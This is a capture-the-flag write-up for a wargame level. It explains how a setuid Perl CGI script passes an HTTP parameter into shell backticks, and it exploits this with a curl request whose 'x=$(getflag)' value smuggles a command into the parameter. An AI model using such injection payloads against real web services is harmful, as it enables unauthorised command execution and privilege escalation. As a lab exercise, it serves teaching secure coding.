# LEVEL04

## Analysis

The binary is a Perl CGI script executed with elevated privileges:
```
    $ ls -la
    [...]
    -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
    [...]
```
```
    level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
```

## Investigation

First we analyse the script content.
```perl
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
    }
    x(param("x"));
```

This script reads q http parameter `x`, stores it in `$y`, and executes it in a shell command using backticks.
N.B: Backticks in Perl execute a system command via `/bin/sh`.

Since `$y` is not sanitized, user input is directly injected into a shell command. This results in a command injection vulnerability.

## Exploitation
Because the script is exposed through a local web server (CGI on port 4747), we can send a crafted HTTP request.

The goal is to inject a command inside the `x` parameter.

```bash
    $ curl '192.168.186.130:4747?x=$(getflag)'
    Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
```

The command substitution is executed by the shell inside the CGI script context, causing `getflag` to run with elevated privileges.


## Takeaways
- Perl backticks execute system commands via `/bin/sh`.
- Unsanitized user input in command execution contexts leads to RCE.
- Setuid CGI binaries are particularly dangerous due to privilege escalation risk.